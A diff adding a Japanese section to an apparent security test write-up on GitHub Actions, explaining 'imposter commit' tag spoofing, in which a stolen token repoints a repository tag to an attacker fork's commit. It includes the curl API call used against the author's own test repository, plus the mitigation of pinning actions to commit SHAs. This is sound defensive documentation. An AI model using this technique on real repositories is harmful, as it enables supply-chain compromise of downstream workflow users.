@@ -194,6 +194,69 @@ GITHUB_TOKEN = ***     →   github_token=ghs_409SkShlpuAk...
 
 ---
 
+## タグ偽装（Imposter Commit）
+
+盗んだ PAT を使い、ターゲットリポジトリのタグを攻撃者のコミットに向ける手法。
+
+### なぜ成立するか
+
+GitHub はフォークネットワーク内の git オブジェクト（コミット）を**共有ストレージ**で管理している。
+そのため、攻撃者のフォークに存在するコミットハッシュを、ターゲットリポジトリのタグに指定できてしまう。
+
+```
+kitahara51/vulnerable-actions-test（攻撃者フォーク）
+  └── コミット 787dac5（攻撃者が用意した悪意あるコード）
+        ↑
+        │ GitHub の共有ストレージに存在する
+        │
+        │ 盗んだ PAT で API を叩く
+        ▼
+codekakitai51/vulnerable-actions-test（ターゲット）
+  └── タグ v1.0.0 → 787dac5 を指すように書き換え
+```
+
+### 実際に使ったコマンド
+
+```bash
+# 盗んだ PAT でタグを作成（攻撃者のコミットハッシュを指定）
+curl -s -X POST \
+  -H "Authorization: Bearer github_pat_xxxx" \
+  -H "Content-Type: application/json" \
+  https://api.github.com/repos/codekakitai51/vulnerable-actions-test/git/refs \
+  -d '{
+    "ref": "refs/tags/v1.0.0",
+    "sha": "787dac5ad5b904f38610f9b1de36ed427bbd2f3a"  ← 攻撃者のコミット
+  }'
+```
+
+### 結果
+
+```
+利用者のワークフロー
+  uses: codekakitai51/vulnerable-actions-test@v1.0.0
+                                               ↑
+                               正規のコードに見えるが
+                               中身は攻撃者（kitahara51）のコミット
+
+タグが指すコードの中身：
+  main ブランチ  → 正規の README（検証まとめ）
+  v1.0.0 タグ   → 攻撃者の README（「kitahara51 のリポジトリです」）
+```
+
+### 対策：タグでなくコミット SHA を固定する
+
+タグは PAT があれば書き換えられるが、コミット SHA は変更できない。
+
+```yaml
+# 脆弱（タグ指定）→ 書き換えられる可能性がある
+uses: codekakitai51/vulnerable-actions-test@v1.0.0
+
+# 安全（コミット SHA 固定）→ 書き換えられない
+uses: codekakitai51/vulnerable-actions-test@787dac5ad5b904f38610f9b1de36ed427bbd2f3a
+```
+
+---
+
 ## 対策
 ### リポジトリ管理者側：攻撃者のコードを checkout しない
 
@@ -209,3 +272,6 @@ GITHUB_TOKEN = ***     →   github_token=ghs_409SkShlpuAk...
 
 `pull_request_target` を使う場合は PR のコードを checkout しない。
 テストは別途 `pull_request` イベントで行う。
+
+
+
